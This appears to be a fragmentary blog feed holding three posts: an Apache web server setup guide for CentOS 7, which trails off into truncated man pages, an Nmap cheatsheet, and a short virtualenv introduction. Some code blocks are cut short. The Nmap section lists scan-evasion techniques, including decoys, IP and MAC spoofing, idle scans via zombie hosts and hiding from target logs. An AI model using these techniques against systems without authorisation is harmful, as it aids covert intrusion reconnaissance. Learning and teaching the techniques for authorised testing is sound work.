<p>The last step is to tell Apache to reload its configuration files with <code>service httpd reload</code>. However, now I ran into some SELinux alert. I looked in <code>/var/log/messages</code>:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Aug  3 16:16:16 localhost setroubleshoot: SELinux is preventing /usr/sbin/httpd from name_connect access on the tcp_socket port 8080.

<p>I ran the mentioned command but was confused by my first brush with SELinux, so I did some google-fu which led me to <a href="https://www.certdepot.net/rhel7-use-selinux-port-labelling/">this post</a>. You can verify what ports are allowed by SELinux for HTTP traffic with the below command:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>

<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>[root@freehat ~]# semanage port -l | grep http
</span><span class='line'>http_cache_port_t              tcp      8080, 8118, 8123, 10001-10010

</span><span class='line'>pegasus_https_port_t           tcp      5989</span></code></pre></td></tr></table></div></figure>


<p>To add port 8080 to http_port_t, I ran <code>semanage port -m -t http_port_t -p tcp 8080</code>, and then I checked it was added. Should be all good now. If you go visit your server on port 8080, you should get a friendly message. To differentiate it from the website on port 80, create another virtual host configuration for that respective server.</p>

<p>You can now access your sites from your own machine, but if you try navigating to them from another computer, it will be just like the websites don&rsquo;t exist! It turns out, iptables is blocking access, and you have to tell it to open the ports:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>[root@freehat sysconfig]# iptables -I INPUT -p tcp --dport 80 -j ACCEPT
</span><span class='line'>[root@freehat sysconfig]# iptables -I INPUT -p tcp --dport 8080 -j ACCEPT</span></code></pre></td></tr></table></div></figure>


<p>And if you want these changes to survive a reboot, you should save them. I had to do some additional work for that. It turns out, <a href="https://stackoverflow.com/questions/24756240/how-can-i-use-iptables-on-centos-7">RHEL 7 and CentOS 7 use <em>firewalld</em></a> to manage iptables. So first I followed the instructions on StackOverflow to stop and mask the firewalld service:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>

</span><span class='line'>Created symlink from /etc/systemd/system/firewalld.service to /dev/null.</span></code></pre></td></tr></table></div></figure>


<p>Then I had to install <em>iptables-services</em>: <code>yum install iptables-services</code>. Next I enabled it at boot:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>

</span><span class='line'>Created symlink from /etc/systemd/system/basic.target.wants/iptables.service to /usr/lib/systemd/system/iptables.service.</span></code></pre></td></tr></table></div></figure>


<p>I also modified the &ldquo;no&rdquo; defaults in <code>/etc/sysconfig/iptables-config</code> to &ldquo;yes&rdquo;:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>

<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class=''><span class='line'># Save current firewall rules on stop.

</span><span class='line'>IPTABLES_SAVE_ON_RESTART="yes"</span></code></pre></td></tr></table></div></figure>


<p>Finally, I was able to save the changes and checked that they persisted after reboot:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>

</span><span class='line'>iptables: Saving firewall rules to /etc/sysconfig/iptables:[  OK  ]</span></code></pre></td></tr></table></div></figure>


<h4>Name-based vhosts</h4>

<p>We&rsquo;ve seen the virtual hosts running on different ports, now let&rsquo;s see how we can <strong>serve them on the same port, but with different names</strong>. I modified one of the config files so that both sites will run on port 80.Let&rsquo;s see the current virtual host settings:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>httpd -S
</span><span class='line'>VirtualHost configuration:
</span><span class='line'>*:80                   is a NameVirtualHost
</span><span class='line'>         default server myweb.local (/etc/httpd/conf.d/myweb.conf:1)
</span><span class='line'>         port 80 namevhost myweb.local (/etc/httpd/conf.d/myweb.conf:1)
</span><span class='line'>         port 80 namevhost skynet.local (/etc/httpd/conf.d/skynet.conf:1)
</span><span class='line'>ServerRoot: "/etc/httpd"
</span><span class='line'>Main DocumentRoot: "/var/www/html"
</span><span class='line'>Main ErrorLog: "/etc/httpd/logs/error_log"
</span><span class='line'>[snip]</span></code></pre></td></tr></table></div></figure>


<p>We will use the server names to navigate to those sites. Because I am testing locally with no DNS, I modified <code>/etc/hosts</code> and added these entries:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>192.168.80.153 myweb.local
</span><span class='line'>192.168.80.153 skynet.local</span></code></pre></td></tr></table></div></figure>


<p>Now I was able to use the names of the sites in the web browser.</p>

<h3>Password protection</h3>

<p>It&rsquo;s time to restrict access to the skynet website! There are a number of ways that Apache can protect a resource with a password and ensure that is accessible only to certain users. In this example, I will want the skynet website to allow only a user called tx. First, I used the <em>htpasswd</em> utility to create a <em>.htpasswd</em> file (you can call it whatever you want), and placed it in <code>/etc/httpd</code>.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>htpasswd -c /etc/httpd/.htpasswd tx
</span><span class='line'>New password: 
</span><span class='line'>Re-type new password: 
</span><span class='line'>Adding password for user tx</span></code></pre></td></tr></table></div></figure>


<p>This file holds the allowed user/password combination:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>cat /etc/httpd/.htpasswd
</span><span class='line'>tx:$apr1$2FI77JZQ$IrMFnxvHzvtRhWGiQfvxL0</span></code></pre></td></tr></table></div></figure>


<p>The next step is to tell Apache to restrict access to a resource based on this file. If you have access to the main configuration file or the virtual host config file, the preferred way is to add a Directory directive there:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nano /etc/httpd/conf.d/skynet.conf
</span><span class='line'>&lt;VirtualHost *:80&gt;
</span><span class='line'>    DocumentRoot "/var/www/html/skynet"
</span><span class='line'>    ServerName skynet.local
</span><span class='line'>    &lt;Directory "/var/www/html/skynet"&gt;
</span><span class='line'>        AuthType Basic
</span><span class='line'>        AuthName "Authorized Only"
</span><span class='line'>        AuthUserFile /etc/httpd/.htpasswd
</span><span class='line'>        Require valid-user
</span><span class='line'>    &lt;/Directory&gt;
</span><span class='line'>&lt;/VirtualHost&gt;
</span></code></pre></td></tr></table></div></figure>


<p>The Directory specified is the one that will be password-protected. Next, we specify the type of authentication (basic in this case, so no super sensitive files should be stored there), the name which will be displayed on the prompt, the location where Apache can find the password file, and the allowed user(s). Maybe we&rsquo;ll want to add some terminators later, so instead of just specifying one user, I allowed any valid user/password combination from the password file.</p>

<p>Now if you try to go to the skynet website, you will see the window prompting for username and password.</p>

<p>Another way you can restrict directory access is via a <strong>.htaccess</strong> file. Due to performance and security reasons, you should avoid this, if possible.</p>

<p>First, create a .htaccess file in the directory you want to protect:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nano /var/www/html/skynet/.htaccess
</span><span class='line'>AuthType Basic
</span><span class='line'>AuthName "Authorized Only"
</span><span class='line'>AuthUserFile /etc/httpd/.htpasswd
</span><span class='line'>Require valid-user</span></code></pre></td></tr></table></div></figure>


<p>For the .htaccess file to work, you need to edit the <code>/etc/httpd/conf/httpd.conf</code> file, and change the <a href="https://httpd.apache.org/docs/current/mod/core.html#allowoverride">AllowOverride directive</a> inside Directory. When set to None, as it is by default, .htaccess files are ignored. Change it to AuthConfig (I had to do it both under /var/www and /var/www/html).</p>

<h3>HTTPS with self-signed certificate</h3>

<p>In the next demo, I will encrypt the skynet website with SSL (removed all the authorization bits for demo purposes).</p>

<p>First, I installed <a href="https://httpd.apache.org/docs/current/mod/mod_ssl.html">mod_ssl</a> with <code>yum install mod_ssl</code>. Next, I created a directory for Apache to store its server key and certificate: <code>mkdir /etc/httpd/myssl</code></p>

<p>Inside this directory, I created a RSA private key of length 2048:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>[root@freehat myssl]# openssl genrsa -out https.key 2048
</span><span class='line'>Generating RSA private key, 2048 bit long modulus
</span><span class='line'>....................+++
</span><span class='line'>..............+++
</span><span class='line'>e is 65537 (0x10001)</span></code></pre></td></tr></table></div></figure>


<p>Then I created a Certificate Signing Request (CSR):</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>

<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>[root@freehat myssl]# openssl req -new -key https.key -out server.csr
</span><span class='line'>You are about to be asked to enter information that will be incorporated
</span><span class='line'>into your certificate request.
</span><span class='line'>What you are about to enter is what is called a Distinguished Name or a DN.

</span><span class='line'>to be sent with your certificate request
</span><span class='line'>A challenge password []:
</span><span class='line'>An optional company name []:</span></code></pre></td></tr></table></div></figure>


<p>Lastly, I generated an x509 certificate with a duration of an year:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>[root@freehat myssl]# openssl x509 -req -days 365 -in server.csr -signkey https.key -out mycert.crt
</span><span class='line'>Signature ok
</span><span class='line'>subject=/C=XX/L=Default City/O=Default Company Ltd
</span><span class='line'>Getting Private key</span></code></pre></td></tr></table></div></figure>


<p>We&rsquo;re not done yet. Edit the file <code>/etc/httpd/conf.d/ssl.conf</code>, and comment the lines with the location of the server key and certificate, replacing them with new ones pointing at our previously created files:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>#SSLCertificateFile /etc/pki/tls/certs/localhost.crt
</span><span class='line'>SSLCertificateFile /etc/httpd/myssl/mycert.crt
</span><span class='line'>#SSLCertificateKeyFile /etc/pki/tls/private/localhost.key
</span><span class='line'>SSLCertificateKeyFile /etc/httpd/myssl/https.key</span></code></pre></td></tr></table></div></figure>


<p>Now restart the server and go to website (mine is at <a href="https://192.168.80.153/">https://192.168.80.153/</a> ). Your browser will warn you about the untrusted connection, add it to exceptions and now you have https on your site.</p>

<h3>Logging</h3>

<p>Lastly, let&rsquo;s go over Apache&rsquo;s logging system. There are 2 types of logs kept, error logs for when some error happens, and access logs, that provide information about incoming requests. By default, these logs are located at <code>/var/log/httpd/error_log</code> and <code>/var/log/httpd/access_log</code> on CentOS</p>

<p>For your sites, you can configure the logs and choose where to store them. I decided to separate the logs for my skynet website. I made a folder for them in /var/log/httpd/skynet-logs, and modified the skynet virtual host config file and added the path and format for the logs:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>CustomLog /var/log/httpd/skynet-logs/skynet-access.log combined
</span><span class='line'>ErrorLog /var/log/httpd/skynet-logs/skynet-error.log</span></code></pre></td></tr></table></div></figure>


<p>I wanted the combined format instead of the common one, because it provides a bit more information, including also the User-agent and the Referer</p>

<p>Hopefully, this post has helped others in setting up an Apache web server. Since I&rsquo;ve installed it on CentOS 7, I also had to account for SELinux and some other differences from a Debian distro, so it&rsquo;s been a good learning experience.</p>

<p>If you want to become an Apache wizard, the <a href="https://httpd.apache.org/docs/2.4/">Apache 2.4 documentation</a> should be a good starting point.</p>

</span><span class='line'># In particular, see

</span><span class='line'>NAME
</span><span class='line'>       apachectl - Apache HTTP Server Control Interface
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>SYNOPSIS
</span><span class='line'>       When  acting  in    pass-through  mode,  apachectl can take all the arguments
</span><span class='line'>       available for the httpd binary.
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>       apachectl [ httpd-argument ]
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>       When acting in SysV init mode, apachectl takes simple,  one-word    commands,
</span><span class='line'>       defined below.
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>       apachectl command
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>SUMMARY
</span><span class='line'>       apachectl  is  a front end to the Apache HyperText Transfer Protocol (HTTP)
</span><span class='line'>       server. It is designed to help the administrator control the functioning of
</span><span class='line'>       the Apache httpd daemon.
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>       The  apachectl script can operate in two modes. First, it can act as a sim‐
</span><span class='line'>       ple front-end to the httpd command that simply sets any necessary  environ‐
</span><span class='line'>       ment  variables    and  then  invokes httpd, passing through any command line
</span><span class='line'>       arguments. Second, apachectl can act as a SysV init script,  taking  simple
</span><span class='line'>       one-word arguments like start, restart, and stop, and translating them into
</span><span class='line'>       appropriate signals to httpd.
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>       If your Apache installation uses non-standard paths, you will need to  edit
</span><span class='line'>       the  apachectl script to set the appropriate paths to the httpd binary. You
</span><span class='line'>       can also specify any necessary httpd command line arguments. See    the  com‐
</span><span class='line'>       ments in the script for details.
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>       The  apachectl script returns a 0 exit value on success, and &gt;0 if an error
</span><span class='line'>       occurs. For more details, view the comments in the script.
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>OPTIONS
</span><span class='line'>       Only the SysV init-style options are  defined  here.  Other  arguments  are
</span><span class='line'>       defined on the httpd manual page.
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>       start  Start  the Apache httpd daemon. Gives an error if it is already run‐
</span><span class='line'>        ning. This is equivalent to apachectl -k start.
</span><span class='line'>
</span><span class='line'>       stop   Stops the Apache httpd daemon. This is equivalent    to  apachectl  -k
</span><span class='line'>        stop.
</span><span class='line'>
</span><span class='line'>       restart
</span><span class='line'>        Restarts  the  Apache httpd daemon. If the daemon is not running, it
</span><span class='line'>        is started. This  command  automatically  checks  the  configuration
</span><span class='line'>        files  as  in  configtest before initiating the restart to make sure
</span><span class='line'>        the daemon doesn't die. This is equivalent to apachectl -k restart.
</span><span class='line'>
</span><span class='line'>       fullstatus
</span><span class='line'>        Displays a full status report from mod_status. For this to work, you
</span><span class='line'>        need  to  have  mod_status  enabled  on your server and a text-based
</span><span class='line'>        browser such as lynx available on  your  system.  The  URL  used  to
</span><span class='line'>        access  the  status report can be set by editing the STATUSURL vari‐
</span><span class='line'>        able in the script.
</span><span class='line'>
</span><span class='line'>       status Displays a brief status report using systemd.
</span><span class='line'>
</span><span class='line'>       graceful
</span><span class='line'>        Gracefully restarts the Apache httpd daemon. If the  daemon  is  not
</span><span class='line'>        running,  it  is  not started. This differs from a normal restart in
</span><span class='line'>        that currently open connections are not aborted. A  side  effect  is
</span><span class='line'>        that  old  log files will not be closed immediately. This means that
</span><span class='line'>        if used in a log rotation script, a substantial delay may be  neces‐
</span><span class='line'>        sary  to  ensure that the old log files are closed before processing
</span><span class='line'>        them. This command automatically checks the configuration  files  as
</span><span class='line'>        in  configtest  before  initiating  the  restart to make sure Apache
</span><span class='line'>        doesn't die. This is equivalent to apachectl -k graceful.
</span><span class='line'>
</span><span class='line'>       graceful-stop
</span><span class='line'>        Gracefully stops the Apache httpd daemon. This differs from a normal
</span><span class='line'>        stop  in  that  currently  open  connections are not aborted. A side
</span><span class='line'>        effect is that old log files will not be closed immediately. This is
</span><span class='line'>        equivalent to apachectl -k graceful-stop.
</span><span class='line'>
</span><span class='line'>       configtest
</span><span class='line'>        Run  a  configuration  file syntax test. It parses the configuration
</span><span class='line'>        files and either reports Syntax Ok or detailed information about the
</span><span class='line'>        particular syntax error. This is equivalent to apachectl -t.
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>       The  following  option  was  available  in  earlier  versions  but has been
</span><span class='line'>       removed.
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>       startssl
</span><span class='line'>        To start httpd with SSL support, you should edit your  configuration
</span><span class='line'>        file  to  include  the  relevant  directives and then use the normal
</span><span class='line'>        apachectl start.

</span><span class='line'>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>SUMMARY
</span><span class='line'>       httpd is the Apache HyperText Transfer Protocol (HTTP) server  program.    It
</span><span class='line'>       is  designed  to be run as a standalone daemon process. When used like this
</span><span class='line'>       it will create a pool of child processes or threads to handle requests.
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>       In general, httpd should not be invoked    directly,  but  rather  should  be
</span><span class='line'>       invoked    via apachectl on Unix-based systems or as a service on Windows NT,
</span><span class='line'>       2000 and XP and as a console application on Windows 9x and ME.
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>OPTIONS
</span><span class='line'>       -d serverroot
</span><span class='line'>        Set the initial value for the ServerRoot  directive  to  serverroot.
</span><span class='line'>        This can be overridden by the ServerRoot directive in the configura‐
</span><span class='line'>        tion file. The default is /etc/httpd.
</span><span class='line'>
</span><span class='line'>       -f config
</span><span class='line'>        Uses the directives in the file config on startup.  If  config  does
</span><span class='line'>        not  begin  with  a /, then it is taken to be a path relative to the
</span><span class='line'>        ServerRoot. The default is conf/httpd.conf.
</span><span class='line'>
</span><span class='line'>       -k start|restart|graceful|stop|graceful-stop
</span><span class='line'>        Signals httpd to start, restart, or stop. See Stopping Apache  httpd
</span><span class='line'>        for more information.
</span><span class='line'>
</span><span class='line'>       -C directive
</span><span class='line'>        Process the configuration directive before reading config files.
</span><span class='line'>
</span><span class='line'>       -c directive
</span><span class='line'>        Process the configuration directive after reading config files.
</span><span class='line'>
</span><span class='line'>       -D parameter
</span><span class='line'>        Sets  a  configuration  parameter  which can be used with &lt;IfDefine&gt;
</span><span class='line'>        sections in the configuration files to conditionally skip or process
</span><span class='line'>        commands at server startup and restart. Also can be used to set cer‐
</span><span class='line'>        tain less-common startup parameters including  -DNO_DETACH  (prevent
</span><span class='line'>        the  parent  from forking) and -DFOREGROUND (prevent the parent from
</span><span class='line'>        calling setsid() et al).
</span><span class='line'>
</span><span class='line'>       -e level
</span><span class='line'>        Sets the LogLevel to level during server startup. This is useful for
</span><span class='line'>        temporarily  increasing  the verbosity of the error messages to find
</span><span class='line'>        problems during startup.
</span><span class='line'>
</span><span class='line'>       -E file
</span><span class='line'>        Send error messages during server startup to file.
</span><span class='line'>

</span><span class='line'>
</span><span class='line'>       -L     Output a list of directives provided  by    static  modules,  together
</span><span class='line'>        with  expected  arguments  and  places where the directive is valid.
</span><span class='line'>        Directives provided by shared modules are not listed.
</span><span class='line'>
</span><span class='line'>       -M     Dump a list of loaded Static and Shared Modules.
</span><span class='line'>
</span><span class='line'>       -S     Show the settings as parsed from the  config  file  (currently  only
</span><span class='line'>        shows the virtualhost settings).
</span><span class='line'>
</span><span class='line'>       -T (Available in 2.3.8 and later)
</span><span class='line'>        Skip document root check at startup/restart.
</span><span class='line'>
</span><span class='line'>       -t     Run  syntax  tests for configuration files only. The program immedi‐
</span><span class='line'>        ately exits after these syntax parsing tests with  either  a  return
</span><span class='line'>        code  of 0 (Syntax OK) or return code not equal to 0 (Syntax Error).
</span><span class='line'>        If -D DUMP_VHOSTS is also set, details of the virtual host  configu‐
</span><span class='line'>        ration  will be printed. If -D DUMP_MODULES  is set, all loaded mod‐

    <id>http://chousensha.github.io/blog/2016/07/31/nmap-cheatsheet</id>
    <content type="html"><![CDATA[<p>Recently, I&rsquo;ve been reading Fyodor&rsquo;s <a href="https://www.amazon.com/Nmap-Network-Scanning-Official-Discovery/dp/0979958717">Nmap Network Scanning</a> book and decided to create an Nmap cheatsheet while at it.</p>

<p>Half of the book, including updated content, is also available for free on <a href="https://nmap.org/book/toc.html">https://nmap.org/book/toc.html</a></p>

<p>Fyodor was also nice enough to set up a machine that you can test your scans against (within reasonable limits), at <a href="http://scanme.nmap.org/">http://scanme.nmap.org/</a></p>

<p>All right, let&rsquo;s get scanning!</p>

<!-- more -->


<h1>Commands cheatsheet</h1>

<h2>Scan types</h2>

<p><strong>-sS</strong>: TCP SYN scan &ndash; the default scan, most popular due to its speed and stealth, as it doesn&rsquo;t complete a TCP connection</p>

<p><strong>-sT</strong>: TCP Connect scan, it uses the connect() system call, used by unprivileged users who can&rsquo;t send raw packets or when scanning IPv6 targets</p>

<p><strong>-sV</strong>: Version detection, omit for performance increase and/or stealth</p>

<p><strong>-sA</strong>: TCP ACK scan, can&rsquo;t tell if the ports are open or closed, but it can determine whether firewall rules are stateful or stateless</p>

<p><strong>-sW</strong>: TCP Window scan, same as ACK, but it can determine open and closed ports on certain systems</p>

<p><strong>-sM</strong>: Maimon scan, yet another special scan type for bypassing firewalls</p>

<p><strong>-sU</strong>: UDP scan. You can improve it by adding a version scan alongside it (but it will be slower)</p>

<p><strong>-sF</strong>: FIN scan, sets the FIN bit, useful in bypassing some firewalls and determining the target&rsquo;s OS between Windows and Unix types, as it doesn&rsquo;t work against Windows</p>

<p><strong>-sX</strong>: Xmas scan, another option for firewall evasion, sets the FIN, PSH, and URG flags, creating the impression of a lit Christmas tree</p>

<p><strong>-sN</strong>: Null scan, doesn&rsquo;t set any flags, an additional option to evade pesky firewalls</p>

<p><strong>-sO</strong>: IP protocol scan, check which IP protocols are supported on the target</p>

<p><strong>-b <FTP relay host></strong>: FTP bounce scan, also available to unprivileged users</p>

<p><strong>-A</strong>: Enable OS detection, version detection, script scanning, and traceroute</p>

<h3>Host discovery</h3>

<p><strong>List scan &ndash; sL</strong> &ndash; enumerates the addresses in the specified range and does reverse DNS lookup on them. Good for getting a feel about the targets by checking their DNS names, and maintaining a low profile on the network (because no ping requests are being sent yet, so it&rsquo;s stealthier)</p>

<p><strong>-p-</strong>: Shortcut for <em>-p1-65535</em></p>

<p><strong>-Pn</strong>: Treat all hosts as online &mdash; skip host discovery (disable ping)</p>

<p><strong>&mdash;exclude &lt;host1[,host2][,host3],&hellip;></strong>: Exclude hosts/networks</p>

<p><strong>-n</strong>: Never do DNS resolution</p>

<p><strong>-sP</strong>: perform a ping sweep</p>

<p><strong>-PS/PA/PU</strong>: TCP SYN ping/TCP ACK ping/UDP ping &ndash; various host discovery options for bypassing firewalls</p>

<h3>Performance</h3>

<p><strong>-T&lt;0-5></strong>: Set timing template (higher is faster). -T4 (aggressive) is recommended for most cases, as it improves performance and optimization for a fast and reliable network. For evasion purposes you can use T0 (paranoid) or T1 (sneaky), but speed will be very slow. To conserve bandwidth and resources you may use T2 (polite), at another significant expense of speed. T3 is the normal mode, and T5 is an insane level of speed (but you might sacrifice some accuracy in the process)</p>

<p><strong>-F</strong>: Fast scan, only scan most common 100 ports</p>

<h3>Evasion</h3>

<p><strong>-D &lt;decoy1,decoy2[,ME],&hellip;></strong>: Cloak a scan with decoys</p>

<p><strong>&mdash;scanflags <flags></strong>: Customize TCP scan flags. You can couple it with specifying a TCP scan type to give Nmap a base of interpreting the results</p>

<p><strong>-S &lt;IP_Address></strong>: Spoof source address</p>

<p><strong>-sI <zombie host[:probeport]></strong>: Idle scan, a complex scan that is stealthy but slow. It uses zombies to perform the scan, without sending packets directly from your IP. Use in tandem with the -PN option to disable ping and not disclose your real address. Avoid -sV, as version detection would also make your IP visible to the target</p>

<p><strong>-f; &mdash;mtu <val></strong>: fragment packets (optionally w/given MTU), can aid in bypassing firewalls that don&rsquo;t handle fragmentation well</p>

<p><strong>-g/&mdash;source-port <portnum></strong>: Spoof source port, bypass security measures that rely only on checking the source port</p>

<p><strong>&mdash;spoof-mac <mac address/prefix/vendor name></strong>: Spoof your MAC address</p>

<p><strong>&mdash;badsum</strong>: Send packets with a bogus TCP/UDP/SCTP checksum. Normal hosts discard packets with bad checksums, but firewalls may omit these checks for performance reasons</p>

<p><strong>&mdash;dns-servers &lt;serv1[,serv2],&hellip;></strong>: Specify custom DNS servers when doing reverse DNS lookup to avoid your DNS server showing up in the target&rsquo;s logs</p>

<h3>Additional info</h3>

<p><strong>-v</strong>: increase verbosity level, you can use it 2 or 3 times to further increase verbosity</p>

<p><strong>-d</strong>: Increase debugging level (use -dd or more for greater effect), can increase to a max of 9</p>

<p><strong>&mdash;packet-trace</strong>: print summary of every packet sent and received</p>

<h3>Output</h3>

<p><strong>-oN/-oX/-oS/-oG <file></strong>: Output scan in normal, XML, sCrIpt kIddi3, and Grepable format, respectively, to the given filename</p>

<p><strong>-oA <basename></strong>: Output in the three major formats at once</p>

<p><strong>&mdash;resume <filename></strong>: Resume an aborted scan</p>

<p>If you don&rsquo;t want Nmap to display its interactive output, you can pass a <em>&ndash;</em> to the format type(s), like so: <code>-oS &ndash;</code></p>

<h2>Useful tips</h2>

<ul>
<li><p><code>nmap -sL -n target</code> &ndash; list IPs to be scanned before actually scanning them</p></li>
<li><p><code>-pT:22,80,U:53</code> &ndash; scan separate TCP and UDP ports (you have to specify a UDP scan in addition to a TCP scan)</p></li>
<li><p><code>&mdash;version-intensity <level></code>: Set from 0 (light) to 9 (try all probes), setting it to 0 will limit the version detection to the most likely to succeed probes, and improve the speed of the scan</p></li>
<li><p>you can scan a network range by adding the subnet mask after an IP like so: <em>ip/numbits</em>. An example would be: 192.168.80.0/24, where the hosts between 192.168.80.0 and 192.168.80.255 would be scanned</p></li>
<li><p>version detection is noisy</p></li>
<li><p>you can specify port 0 for a scan, to catch malicious software that might listen on it</p></li>
</ul>


<h2>Script scanning</h2>

<p><strong>-sC</strong>: enable some common scripts, may be intrusive to the target</p>

<p><strong>&mdash;script</strong>=<Lua scripts>: <Lua scripts> is a comma separated list of directories, script-files or script-categories</p>

<p><a href="https://nmap.org/book/nse-usage.html">Currently defined categories</a> are:</p>

<p>Many thanks to Fyodor for creating such an awesome tool and freely sharing with everyone! As you can see, Nmap is so much more than just a port scanner. You can easily perform some sort of vulnerability analysis and exploitation with it, and if there is no task that you would like Nmap to do and it can&rsquo;t, you can write the code yourself and contribute to this amazing project.</p>

    <content type="html"><![CDATA[<p>In this post I am going to introduce Python&rsquo;s virtual environments, through the <strong>virtualenv</strong> tool. With this tool, you can keep separate environments for your projects, with their own dependencies and executables. By isolating the project environments, you can keep them neat and organized, without messing up your global installation. Depending on the requirements of what you&rsquo;re working on, you can use different versions of Python or keep older libraries on a per-project basis. Nothing outside the virtual environment will be modified.</p>

<h1>Installation</h1>

<p>To begin with, install <em>virtualenv</em>. You can do it in several ways. Via pip: <code>pip install virtualenv</code>, or with easy_install: <code>easy_install virtualenv</code>. Now let&rsquo;s look at the help menu:</p>

<h1>Usage</h1>

<p>So you&rsquo;re about to begin a new project. You want to start from scratch and keep it contained to itself. Creating a virtual environment will help you accomplish that:</p>

<p><code>virtualenv my_project</code></p>

<p>Now you can go to the newly created directory and see that there are already some folders inside. <code>bin</code> has the executables, <code>include</code> holds the header files, and <code>lib</code> contains the files of the installed modules in the virtual environment.</p>

<p>Before you begin to work with your new environment, you need to activate it with <code>source bin/activate</code> or <code>source env_name/bin/activate</code> if you are outside the environment&rsquo;s directory.</p>

<p>You will now see your propmt change, to confirm that the environment is active. For me, it looks like:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>(my_project) root@kali:~/projects/my_project#</span></code></pre></td></tr></table></div></figure>


<p>Now you can begin your work, installing packages, etc. When you&rsquo;re done, you can type <code>deactivate</code> to exit your environment. If you want to delete it, just remove its directory.</p>

